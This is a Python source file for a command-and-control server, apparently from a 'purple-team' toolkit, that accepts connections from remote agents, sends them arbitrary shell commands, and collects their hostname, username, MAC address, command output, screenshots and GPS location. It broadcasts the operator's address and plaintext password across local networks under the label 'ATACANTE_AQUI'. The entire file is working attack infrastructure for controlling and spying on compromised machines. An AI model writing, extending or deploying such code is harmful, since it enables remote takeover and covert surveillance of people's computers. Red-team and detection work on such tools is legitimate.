import asyncio
import json
import socket
import struct
import threading
import time
from datetime import datetime
from typing import Dict, Optional, Set, Callable, Any
from uuid import uuid4

from ..core.config import config
from ..core.logger import logger
from ..core.crypto import crypto
from ..core.types import AgentInfo, AgentStatus, Command
from ..core.database import db


class C2Server:
    def __init__(self):
        self._host = config.get("c2.host", "0.0.0.0")
        self._tcp_port = config.get("c2.tcp_port", 5555)
        self._udp_port = config.get("c2.udp_port", 5556)
        self._password = config.get("c2.password", "purple-team-2024")
        self._max_attempts = config.get("c2.max_attempts", 3)
        self._timeout = config.get("c2.timeout", 30)
        self._broadcast_interval = config.get("c2.broadcast_interval", 2)

        self._agents: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()
        self._running = False
        self._tcp_server: Optional[socket.socket] = None
        self._udp_sock: Optional[socket.socket] = None
        self._callbacks: Dict[str, Callable] = {}

        self._next_id = 1

    def on(self, event: str, callback: Callable) -> None:
        self._callbacks[event] = callback

    def _emit(self, event: str, *args: Any, **kwargs: Any) -> None:
        if event in self._callbacks:
            try:
                self._callbacks[event](*args, **kwargs)
            except Exception as e:
                logger.error(f"Callback error for {event}: {e}")

    def start(self) -> None:
        self._running = True

        tcp_thread = threading.Thread(target=self._tcp_listener, daemon=True)
        udp_thread = threading.Thread(target=self._udp_listener, daemon=True)
        broadcast_thread = threading.Thread(target=self._broadcaster, daemon=True)

        tcp_thread.start()
        udp_thread.start()
        broadcast_thread.start()

        logger.info(
            f"C2 Server started on {self._host}:{self._tcp_port} (TCP) / {self._udp_port} (UDP)"
        )
        self._emit("started", self)

    def stop(self) -> None:
        self._running = False
        if self._tcp_server:
            try:
                self._tcp_server.close()
            except Exception:
                pass
        if self._udp_sock:
            try:
                self._udp_sock.close()
            except Exception:
                pass
        logger.info("C2 Server stopped")
        self._emit("stopped", self)

    def _tcp_listener(self) -> None:
        self._tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._tcp_server.bind((self._host, self._tcp_port))
            self._tcp_server.listen(50)
        except Exception as e:
            logger.error(f"TCP bind failed: {e}")
            return

        while self._running:
            try:
                conn, addr = self._tcp_server.accept()
                agent_id = self._next_id
                self._next_id += 1
                thread = threading.Thread(
                    target=self._handle_agent,
                    args=(conn, addr, agent_id),
                    daemon=True,
                )
                thread.start()
            except Exception:
                if self._running:
                    logger.exception("TCP accept error")

    def _udp_listener(self) -> None:
        self._udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._udp_sock.bind((self._host, self._udp_port))
            self._udp_sock.settimeout(1)
        except Exception as e:
            logger.error(f"UDP bind failed: {e}")
            return

        while self._running:
            try:
                data, addr = self._udp_sock.recvfrom(2048)
                msg = data.decode("utf-8").strip()
                if msg.startswith("AGENT_DISCOVER:"):
                    agent_info = msg.split(":", 1)[1] if ":" in msg else ""
                    logger.debug(f"UDP discovery from {addr[0]}: {agent_info}")
            except socket.timeout:
                continue
            except Exception:
                if self._running:
                    logger.exception("UDP recv error")

    def _broadcaster(self) -> None:
        ip = self._get_local_ip()
        msg = f"ATACANTE_AQUI:{ip}:{self._tcp_port}:{self._password}"
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                encoded = msg.encode()
                for bcast in [
                    "255.255.255.255",
                    "192.168.163.255",
                    "192.168.1.255",
                    "10.0.2.255",
                ]:
                    try:
                        sock.sendto(encoded, (bcast, self._udp_port))
                    except Exception:
                        continue
                sock.close()
            except Exception:
                logger.exception("Broadcast error")
            time.sleep(self._broadcast_interval)

    def _handle_agent(self, conn: socket.socket, addr: tuple, agent_id: int) -> None:
        ip = addr[0]
        logger.info(f"Agent connection from {ip}")

        try:
            conn.settimeout(self._timeout)
            data = conn.recv(4096)
            if not data:
                conn.close()
                return

            agent_data = self._parse_handshake(data)
            agent_id_str = agent_data.get("agent_id", f"agent-{agent_id}")
            is_encrypted = agent_data.get("encrypted", False)

            if is_encrypted:
                try:
                    agent_data = crypto.decrypt_payload(agent_data)
                except Exception as e:
                    logger.warning(f"Decryption failed for {ip}: {e}")
                    conn.close()
                    return

            agent_info = AgentInfo(
                agent_id=agent_id_str,
                hostname=agent_data.get("hostname", ""),
                username=agent_data.get("username", ""),
                os=agent_data.get("os", ""),
                ip=agent_data.get("ip", ip),
                mac=agent_data.get("mac", ""),
                status=AgentStatus.ONLINE,
                tags=agent_data.get("tags", []),
                modules=agent_data.get("modules", []),
            )

            with self._lock:
                self._agents[agent_id_str] = {
                    "conn": conn,
                    "addr": addr,
                    "info": agent_info,
                    "cmd_buffer": "",
                    "connected_at": datetime.utcnow(),
                    "auth_attempts": 0,
                    "authenticated": False,
                }

            db.upsert_agent(agent_info.to_dict())
            self._emit("agent_connected", agent_info)
            logger.info(f"Agent {agent_id_str} ({ip}) registered")

            self._send_auth_challenge(conn, agent_id_str)

            conn.settimeout(None)
            buf = b""
            while self._running:
                try:
                    data = conn.recv(8192)
                    if not data:
                        break
                    buf += data
                    buf = self._process_agent_data(agent_id_str, buf)
                except socket.timeout:
                    continue
                except Exception:
                    logger.exception(f"Agent {agent_id_str} recv error")
                    break

        except socket.timeout:
            logger.warning(f"Agent {ip} timed out during handshake")
        except Exception:
            logger.exception(f"Agent {ip} handler error")
        finally:
            with self._lock:
                if agent_id_str in self._agents:
                    self._agents[agent_id_str]["info"].status = AgentStatus.OFFLINE
                    db.upsert_agent(
                        self._agents[agent_id_str]["info"].to_dict()
                    )
                    del self._agents[agent_id_str]
            try:
                conn.close()
            except Exception:
                pass
            logger.info(f"Agent {agent_id_str} disconnected")
            self._emit("agent_disconnected", agent_id_str)

    def _send_auth_challenge(self, conn: socket.socket, agent_id: str) -> None:
        import hashlib
        challenge = f"AUTH_CHALLENGE:{uuid4().hex}:{datetime.utcnow().isoformat()}"
        try:
            conn.send(challenge.encode())
            response = conn.recv(256).decode().strip()
            expected = hashlib.sha256(
                f"{challenge}:{self._password}".encode()
            ).hexdigest()
            if response == expected:
                with self._lock:
                    if agent_id in self._agents:
                        self._agents[agent_id]["authenticated"] = True
                conn.send(b"AUTH_OK")
                logger.info(f"Agent {agent_id} authenticated")
            else:
                with self._lock:
                    if agent_id in self._agents:
                        self._agents[agent_id]["auth_attempts"] += 1
                        if (
                            self._agents[agent_id]["auth_attempts"]
                            >= self._max_attempts
                        ):
                            conn.send(b"AUTH_FAIL")
                            logger.warning(f"Agent {agent_id} auth failed, disconnecting")
                            raise ConnectionError("Auth failed")
                        conn.send(b"AUTH_RETRY")
            self._emit("agent_auth", agent_id, response == expected)
        except Exception as e:
            logger.error(f"Auth error for {agent_id}: {e}")
            raise

    def _parse_handshake(self, data: bytes) -> Dict[str, Any]:
        try:
            return json.loads(data.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            info = {}
            text = data.decode("utf-8", errors="replace")
            for line in text.split("\n"):
                line = line.strip()
                if line.startswith("[IP]"):
                    info["ip"] = line[4:]
                elif line.startswith("[PCINFO]"):
                    parts = line[8:]
                    for part in parts.split("|"):
                        if ":" in part:
                            k, v = part.split(":", 1)
                            info[k.lower()] = v
            info["agent_id"] = info.get("hostname", f"agent-{uuid4().hex[:8]}")
            return info

    def _process_agent_data(self, agent_id: str, buf: bytes) -> bytes:
        agent = self._agents.get(agent_id)
        if not agent:
            return b""

        while b"[SSIMG]" in buf:
            idx = buf.index(b"[SSIMG]")
            if len(buf) >= idx + 10:
                length = struct.unpack("!I", buf[idx + 6 : idx + 10])[0]
                img_start = idx + 10
                if len(buf) >= img_start + length:
                    img_data = buf[img_start : img_start + length]
                    buf = buf[img_start + length :]
                    self._emit("screenshot", agent_id, img_data)
                else:
                    break
            else:
                break

        text = buf.decode("utf-8", errors="replace")
        for line in text.split("\n"):
            line = line.strip()
            if not line:
                continue
            if line.startswith("[PCINFO]"):
                agent["info"].pcinfo = line[8:]
                self._emit("agent_info", agent_id, line[8:])
            elif line.startswith("[CMDOUT]"):
                output = line[8:]
                agent["cmd_buffer"] += output + "\n"
                self._emit("cmd_output", agent_id, output)
            elif line.startswith("[CMDERR]"):
                self._emit("cmd_error", agent_id, line[8:])
            elif line.startswith("[GPS]"):
                agent["last_gps"] = line[5:]
                self._emit("gps", agent_id, line[5:])

        return b""  # processed buffer

    def send_command(self, agent_id: str, command: str) -> bool:
        with self._lock:
            if agent_id not in self._agents:
                logger.warning(f"Agent {agent_id} not found")
                return False
            conn = self._agents[agent_id]["conn"]

        try:
            cmd = Command(agent_id=agent_id, command=command)
            db.add_command(cmd.to_dict())
            payload = f"[CMD]{command}"
            conn.send(payload.encode())
            self._emit("command_sent", agent_id, command)
            return True
        except Exception as e:
            logger.error(f"Send command to {agent_id} failed: {e}")
            return False

    def send_raw(self, agent_id: str, data: bytes) -> bool:
        with self._lock:
            if agent_id not in self._agents:
                return False
            conn = self._agents[agent_id]["conn"]
        try:
            conn.send(data)
            return True
        except Exception:
            return False

    def get_agent(self, agent_id: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            if agent_id in self._agents:
                agent = self._agents[agent_id]
                info = agent["info"]
                return {
                    **info.to_dict(),
                    "authenticated": agent["authenticated"],
                    "connected_at": agent["connected_at"].isoformat(),
                }
        return db.get_agent(agent_id)

    def list_agents(self, status: Optional[str] = None) -> list:
        with self._lock:
            agents = []
            for agent_id, agent in self._agents.items():
                if status and agent["info"].status.name.lower() != status:
                    continue
                agents.append(
                    {
                        **agent["info"].to_dict(),
                        "authenticated": agent["authenticated"],
                    }
                )
            if status:
                db_agents = db.list_agents(status)
                online_ids = {a["agent_id"] for a in agents}
                agents.extend(
                    [a for a in db_agents if a["agent_id"] not in online_ids]
                )
            return agents or db.list_agents(status)

    def disconnect_agent(self, agent_id: str) -> bool:
        with self._lock:
            if agent_id in self._agents:
                try:
                    self._agents[agent_id]["conn"].close()
                except Exception:
                    pass
                return True
        return False

    def get_cmd_buffer(self, agent_id: str, clear: bool = True) -> str:
        with self._lock:
            if agent_id in self._agents:
                buf = self._agents[agent_id].get("cmd_buffer", "")
                if clear:
                    self._agents[agent_id]["cmd_buffer"] = ""
                return buf
        return ""

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            online = sum(
                1
                for a in self._agents.values()
                if a["info"].status == AgentStatus.ONLINE
            )
        db_stats = db.get_stats()
        return {
            "agents_online": online,
            "agents_total": len(self._agents),
            **db_stats,
            "tcp_port": self._tcp_port,
            "udp_port": self._udp_port,
            "running": self._running,
        }

    @staticmethod
    def _get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"


c2_server = C2Server()
